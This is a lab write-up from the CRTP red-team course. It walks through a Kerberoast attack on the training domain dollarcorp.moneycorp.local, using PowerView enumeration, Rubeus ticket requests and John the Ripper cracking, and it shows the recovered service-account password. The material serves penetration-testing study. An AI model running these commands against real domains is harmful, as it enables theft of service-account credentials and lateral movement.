# CRTP: Hands-On 14

```
  â€¢ Using the Kerberoast attack, crack password of a SQL server service account.
```

## Kerberoast attack

Detect domain users with SPM enabled:

```
 Get-DomainUser -SPN | select samaccountname, serviceprincipalname

samaccountname serviceprincipalname
-------------- --------------------
krbtgt         kadmin/changepw
websvc         {SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL, SNMP/ufc-adminsrv}
svcadmin       {MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433, MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}
```


Use rubeos for kerberoast attack:

```
C:\AD\Tools\Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1


[*] Action: Kerberoasting

[*] Using 'tgtdeleg' to request a TGT for the current user
[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
[*] Target User            : svcadmin
[*] Target Domain          : dollarcorp.moneycorp.local
[+] Ticket successfully imported!
[*] Searching for accounts that only support RC4_HMAC, no AES
[*] Searching path 'LDAP://dcorp-dc.dollarcorp.moneycorp.local/DC=dollarcorp,DC=moneycorp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=svcadmin)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))'

[*] Total kerberoastable users : 1

[*] Hash written to C:\AD\Tools\hashes.txt

[*] Roasted hashes written to : C:\AD\Tools\hashes.txt
```

Remove ":443" on the output hash:
```
$krb5tgs$23$*svcadmin$DOLLARCORP.MONEYCORP.LOCAL$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local*$7CEF52FB251C4EFBB8BCBA79102DFD37$69A9D01C36CC4BBF8FD69D36EB4BB6F74CA9FA66AD396B6080A4BD950A277D81A5661E0F0E7E27DB220F1CA80824E284B1AF92AA5DAE365676902A982D10CD610CBCEE36C80022780DF00FC4406B20D6AE85D58CBA44FCF61574BAA8D76654C3F155DA3423AD5B883059C036CFF255A68155963FD9CB2479E15B40AD5635A9A626CAE49CB19BEE1A4367933E9B2B4AD4313456C3A56ADD47864594B3203BAFB62D2E669FF3339A0DC4F9BF1864B0619A06C20E1845D899B3CE5679882181F8405F69B4CD46E9F8DC7C1BD22B57693D0018E1A6CAD932FD805856459B0D0AE8AB7E33418FC5C0F1CE1F23A7BDEEEEE330FA26544DEB82AB848E6314716A7F5C6BE13AE235BC47DF10ACB2ED0CD022850E6AAC44613E6665321901EEDD720B66B0F6ABA5F106747DBC3187E4E1214170769E23C3ACB91B9059E1609A16E8ED58E915E42BF003BF791BAC9D8FBC71B3E5A853963EAAB5870607483F65C367C2FA4984D2DD9881D26A966B1D9DA05B6379B15C80E19688985EE21C050766B2CC8BF54C5782D06AFDEBBC92C64CEB2D65A652435FB964C2F2FD54055209492377C58AC8E00E764D071A6D10A91B13833107B05052E92343B367F3BF6161D3118941B4B93571D78E55E05DB046DF3C5A71FFB0FD03591E360C0B71D50CBC3026DC01F9E8752D2B9F0842AC981BA4796F2C9B2C8F14D4EFEABD482B1C5F64FF08CFB3D6A3199B841B07C1879538913114A8EDC13710260398341948E523092F62E1594F3F3B7D382A3533D54901827F3FDBB76E2C89DB6303F12C8C428AE09C78E864115250BE351DC1A76B0E6616C52EBED973E6F265245B5E4E79E5B76EF2025C54F7B0B8956FFA52554FDCB273E1BEA2F3987C22AB8B7D349AB2C68157EB98331C1E731613ACB92F1C5288E970491B20F034E942EAF4D754DB75FAA9CD64E317669B05C19D236625EB377348FC9783F61408C783A4CA15CC628AB062BAF0A2D5CCA1B97D34971E2F88D8659ED19DC7187A88EF1FC16260A34FEE33D4C30633E91C51A0F36C1AD2B3BCFF52BEDD9656E1CBDFB8B9189A5E1040ACFD155410F617D6C12E5891BB009EF4BABF5ADF53D7E334331F73B91D27BA0A12DB5C972AC51879B868B3224EEDA7D88B4D5AD046C3C0083FD3D49D079D26BE56A88859FCC842CAAC5D565255A77B337988D7C7C6DC820511E3F91B1B3CD9B45E087E39368560F600D3C0AF84CDC952B6B11242EBA11EC194EA6A32A982365169E5B5A924BF6D184268731B126CC5CDCCD0DFAB7A52B2B8DA8B9B75AD7FF7A80C48DDD52CCCD26B2B7B2E84E65C7FA5A94F8642E9C64C93DC229DAAAEAC683B421750E425E22368FA392307BCE5B96A368FB1C6946D3779B22198DCCF4FC787E1B0D6FB7D0CFBA523DB4C84DBF80A0BE8088E298369EBDDDBCEF7ED9EFF7FAB67FB045CC00CC4E5A76F76DA9112C00B2628D92853CC8F7A34F79D7DA8A8A7DC864558BCBAC31C231463ED527B90908279DB51E4A4C1F26E723AC3A4F4193F346BA8FBE0F1D7EEFD7449F3D956BEFB561C08F508F6C53E92BA0253B12672D070570D22377F17D6E4AA31ED2D0CE5A734DB5F9679E3C6B5313A19CF83DA1B142E8D2BF9F8F932C85939E54310693A963A6CC4DF71474C2E5B14EED8E4DD7615F2F8B452D786EC
```

Perform local attack:

```
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*ThisisBlasphemyThisisMadness!! (?)
1g 0:00:00:00 DONE (2023-05-02 09:05) 58.82g/s 120470p/s 120470c/s 120470C/s energy..mollie
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```
